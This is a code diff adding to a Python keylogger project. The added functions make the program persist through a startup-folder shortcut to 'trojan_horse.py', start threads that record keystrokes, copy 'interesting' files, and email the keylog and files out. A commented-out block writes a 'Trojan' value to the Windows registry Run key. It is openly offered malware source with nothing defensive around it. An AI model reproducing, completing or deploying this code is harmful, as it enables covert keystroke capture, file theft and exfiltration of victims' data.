@@ -387,3 +387,83 @@ class KeyLogger(object):
         log_message = "Chrome does not seem to be running\n"
         self.log_controller.writeMessage(log_message)
         return False
+
+
+# Wasn't working out for us
+def add_self_to_startup():
+    log_controller = Log()
+
+    if 'test.lnk' not in os.listdir(Constants.STARTUP_LOCATION):
+        test_path = os.listdir(r"C:\\")
+        for x in range(36, 22, -1):
+            version = "Python" + str(x)
+            print(version)
+            if version in test_path:
+                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.ROOT, "Python" + str(x))
+                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.PYTHON_DEFAULT_PATH, "python.exe")
+                break
+
+        ws = win32.Dispatch("wscript.shell")
+        scut = ws.CreateShortcut(Constants.STARTUP_LOCATION + r"\test.lnk")
+        scut.TargetPath = Constants.PYTHON_DEFAULT_PATH
+        scut.Arguments = os.path.join("\"" + Constants.SELF_lOCATION, "trojan_horse.py" + "\"")
+        scut.Save()
+        log_controller.writeMessage("Added shortcut to startup menu")
+    else:
+        log_controller.writeMessage("Shortcut ALREADY to startup menu")
+
+
+def kickOff():
+    # Create the Keylogger object
+    keylogger = KeyLogger()
+
+    # Define the threads for the keylogger
+    start_keylogger_thread = threading.Thread(target=keylogger.startKeyLogger)
+    stop_timer = threading.Thread(target=keylogger.stopkeylogger)
+    keylogger_mail_thread = threading.Thread(target=keylogger.send_keylog)
+    stop_keylogger_mail_thread = threading.Thread(target=keylogger.stop_to_send_keylog)
+
+    # Create the OSmanipulation object for copying interesting files
+    file_copy = OSmanipulation()
+
+    # Define the threads for the keylogger
+    searching_thread = threading.Thread(target=file_copy.Copy_interesting_files)
+    stop_searching_thread = threading.Thread(target=file_copy.stop_copying)
+
+    # Create the email object
+    attachmail = AttachMail()
+
+    # Define email thread
+    email_thread = threading.Thread(target=attachmail.sendMailInFolder)
+
+    # Start the threads for the keylogger
+    start_keylogger_thread.start()
+    stop_timer.start()
+    keylogger_mail_thread.start()
+    stop_keylogger_mail_thread.start()
+    # Start the threads for file copy
+    searching_thread.start()
+    stop_searching_thread.start()
+
+    # Start the threads for emailing
+
+    email_thread.start()
+
+
+def email_test():
+    email_controller = Email()
+    email_controller.startserver()
+    email_controller.sendemail("Hello from ")
+    email_controller.stopserver()
+
+
+# import winreg
+# key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+#                      'Software\Microsoft\Windows\CurrentVersion\Run',
+#                      winreg.KEY_SET_VALUE)
+# winreg.SetValueEx(key, 'Trojan', 0, winreg.REG_SZ, Constants.SELF_lOCATION)
+# kickOff()
+if __name__ == "__main__":
+    # call your code here
+    kickOff()
+    # email_test()
